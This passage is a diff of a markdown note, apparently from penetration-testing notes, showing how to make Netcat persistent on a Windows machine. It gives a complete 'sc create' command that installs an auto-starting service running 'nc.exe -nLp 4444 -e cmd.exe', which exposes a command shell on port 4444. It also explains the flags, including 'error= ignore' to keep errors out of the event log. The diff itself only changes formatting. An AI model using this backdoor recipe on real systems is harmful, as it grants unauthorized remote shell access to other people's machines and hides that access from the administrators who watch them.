@@ -15,9 +15,9 @@ to make Netcat a persistent to be able to return to the machine.
 Service executables are no regular executables. Upon start, the service
 process returns directly after starting, but keeps the process running.
 
-Just using `nc.exe` would block the service control and keep the status
-"starting...". So we use `cmd /c start ...` to return immediately after
-spawning the `nc.exe` process.
+Just using "_nc.exe_" would block the service control and keep the status
+"starting...". So we use "_cmd /c start ..._" to return immediately after
+spawning the "_nc.exe_" process.
 
 ```dos
 C:\Windows\system32>sc create NcService binPath= "cmd.exe /c start c:\nc.exe -nLp 4444 -e cmd.exe" start= auto error= ignore
@@ -27,9 +27,9 @@ C:\Windows\system32>
 ```
 
 ## Netcat options
-Starting netcat with `c:\nc.exe -nLp 4444 -e cmd.exe`.
+Starting netcat with "_c:\nc.exe -nLp 4444 -e cmd.exe_".
 
-The options provided to `nc.exe`:
+The options provided to "_nc.exe_":
 
   * -n : Numeric ip-address, no DNS
   * -L : Persistent listener, restart listening after disconnect.
@@ -37,7 +37,7 @@ The options provided to `nc.exe`:
   * -e : The program to run upon connect.
 
 ## Netcat service create options
-The options provided to `sc create`:
+The options provided to "_sc create_":
 
   * "start= auto" : Automatically start the service on booting
   * "error= ignore" : Do not log errors to eventlog.
